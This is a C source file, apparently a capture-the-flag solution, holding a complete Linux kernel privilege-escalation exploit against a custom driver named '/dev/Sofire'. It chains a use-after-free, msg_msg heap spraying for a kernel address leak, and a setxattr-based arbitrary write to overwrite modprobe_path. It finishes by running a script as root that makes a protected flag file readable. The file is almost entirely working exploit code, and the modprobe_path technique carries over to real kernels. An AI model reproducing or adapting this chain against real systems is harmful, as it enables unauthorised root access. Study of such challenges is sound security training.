#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/msg.h>
#include <sys/ipc.h>

#define SOFI_READ   0xcafebabe
#define SOFI_WRITE  0xbabecafe
#define SOFI_CREATE 0xdeadbeef
#define SOFI_DELETE 0X1337

#define DEV "/dev/Sofire"
#define PAGE 0x1000
#define CHUNK_SIZE 0x100
#define MSG_COPY 040000

int fd;

typedef struct 
{
        long mtype;
        char mtext[0x1300];
}msg;

// size 128 / 0x80
typedef struct sofirium_head{
    char coin_art[0x70];
    struct sofirium_entry* head;
    int total_nft;
} sofirium_head;

// size 264 / 0x108
typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;

// size 260 / 0x104
typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

void sofi_add(char* buffer){
    request req;
    memcpy(req.buffer, buffer, sizeof(req.buffer));
    ioctl(fd, SOFI_CREATE, &req);
}

void sofi_delete(){
    request req = {
        .idx = 0,
        .buffer = 0
    };
    ioctl(fd, SOFI_DELETE, &req);
}

void sofi_read(int idx, char* buffer){
    request req = {
        .idx = idx
    };
    ioctl(fd, SOFI_READ, &req);
    memcpy(buffer, req.buffer, sizeof(req.buffer));
}

void sofi_write(int idx, char* buffer){
    request req = {
        .idx = idx
    };
    memcpy(req.buffer, buffer, sizeof(req.buffer));
    ioctl(fd,SOFI_WRITE, &req);
}

void print_leak(char* buffer, int n){
    for (int i = 0; i < n; i++){
        printf("%d | 0x%lx\n", i, *(((unsigned long*)buffer)+i));
    }
}

void prepare(){
    /* prepare modproble_path exploitation */
    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt' > /tmp/w");
    system("chmod +x /tmp/w");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/x");
    system("chmod +x /tmp/x");
}

int main(){
    request req;
    unsigned long* buffer = mmap((void*)0xdeadbeef, 2*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    fd = open(DEV, O_RDONLY);
    printf("%lx\n", fd);

    prepare();

    // UAF
    // idx = 0
    memset(buffer, 0x41, CHUNK_SIZE);
    sofi_add(buffer);

    // idx = 1
    memset(buffer, 0x42, CHUNK_SIZE);
    sofi_add(buffer);

    sofi_delete();


    // spray
    // for (int i = 0; i < 5; i++)
        // setxattr("/tmp", "x", "CCCC", 300, XATTR_CREATE);
    
    // msg_msg
    msg spray;
    spray.mtype = 0x1337;
    memset(spray.mtext, 0x41, 8);
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    int qid2 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    msgsnd(qid, &spray, 300, 0);

    // getchar();
    // kleak
    memset(buffer, 0, CHUNK_SIZE);
    sofi_read(0, buffer);
    // print_leak(buffer, 50);

    unsigned long kleak_offset = buffer[31] + 0x370 - 8;

    sofi_read(1, buffer);
    // print_leak(buffer, 50);
    
    printf("[*] kleak_offset: %p\n", kleak_offset);
    buffer[2] = 0x1300;
    buffer[3] = kleak_offset;
    // buffer[3] = 0x4141414141414141;
    sofi_write(1, buffer);

    sofi_read(1, buffer);
    
    msgrcv(qid, buffer, 0x1300, 0, IPC_NOWAIT | MSG_NOERROR);
    // print_leak(buffer, 0x1300/8);

    unsigned long kbase = buffer[169] - 0x3ff5d0;
    unsigned long modprob_path = kbase + 0x1851400;

    printf("[*] kernel base: %p\n", kbase);
    printf("[*] modprob_path: %p\n", modprob_path);

    // idx = 2
    memset(buffer, 0x44, CHUNK_SIZE);
    sofi_add(buffer);

    // spray.mtype = 0x1111;
    // msgsnd(qid2, &spray, 300, 0);
    // buffer[2] = 0x1300;
    // buffer[3] = modprob_path - 8;
    // buffer[3] = 0x4141414141414141;
    // sofi_write(1, buffer);

    // sofi_read(1, buffer);
    // memset((char*)spray.mtext, 0x47, 0x1300);

    // msgsnd(qid2, &spray, 0x1300, 0);
    // msgrcv(qid2, buffer, 0x1300, 0, IPC_NOWAIT | MSG_NOERROR);
    // sofi_read(1, buffer);

    // Arb write
    // overwrite sofirium_entry's next pointer to modprob_path-8
    // then write /tmp/x to it
    // thanks to lanleft for introducing setxattr method

    memset(buffer, 0, PAGE);
    buffer[0] = modprob_path - 8;
    setxattr("/etc/passwd", "a", buffer, 0x110, 0);

    
    memset(buffer, 0, PAGE);
    memcpy(buffer, "/tmp/w", sizeof("/tmp/w"));
    sofi_write(2, buffer);

    memset(buffer, 0, PAGE);
    // sofi_read(2, buffer);
    // print_leak(buffer, 10);

    system("/tmp/x");
    system("cat /flag.txt");
}